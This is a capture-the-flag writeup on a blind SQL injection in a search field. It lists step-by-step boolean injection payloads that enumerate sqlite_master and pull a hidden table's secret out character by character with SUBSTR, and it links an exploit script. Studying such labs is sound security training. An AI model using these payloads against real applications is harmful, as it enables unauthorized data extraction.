# Challenge `Sometimes we are just temporarily blind` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Blind SQL Injection
- Where: Where is the vulnerability present
  - Search bar input field, the parameter is incorporated into an SQL query without proper sanitization. Although blog posts are no longer displayed, the application still returns a different message indicating how many articles were found, which can be leveraged as a side-channel.
- Impact: What results of exploiting this vulnerability
  - Enumerate database tables using sqlite_master
  - Extract database schema
  - Read hidden tables and sensitive information
  - Fully exfiltrate confidential data
  - Even without visible query results, the database can be completely compromised.

## Steps to reproduce

1. Interact with the search functionality and observe that the response text changes depending on the condition, for example:
```
' AND 1=1 -- -> Found 4 articles
' AND 1=0 -- -> Found 0 articles
```
2. Use this difference to perform boolean-based blind SQL injection.
3. Determine the number of tables in the database by injecting:
```
' AND (SELECT COUNT(name) FROM sqlite_master WHERE type='table') = X --
```
Increment X until the response indicates a true condition.  
4. For each table index, determine the length of the table name using:
```
' AND LENGTH((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET N)) = L --
```
5. Extract each table name character-by-character using:
```
' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET N), P, 1) = 'a' --
```
Identify a hidden table named: `super_s_sof_secrets`  
6. Extract the SQL schema of the secret table via:
```
' AND LENGTH((SELECT sql FROM sqlite_master WHERE name='super_s_sof_secrets')) = L --
```
and then reconstruct it character-by-character using SUBSTR.  
7. Determine the length of the secret stored in the table:
```
' AND LENGTH((SELECT secret FROM super_s_sof_secrets LIMIT 1)) = L --
```
8. Extract the secret value character-by-character using:
```
' AND SUBSTR((SELECT secret FROM super_s_sof_secrets LIMIT 1), P, 1) = 'C' --
```

> **Note:** The script may intermittently lose connection. If this occurs, remove or bypass initial steps and continue from the last successful query.

[Sometimes_we_are_just_temporarily_blind.py](Sometimes_we_are_just_temporarily_blind.py)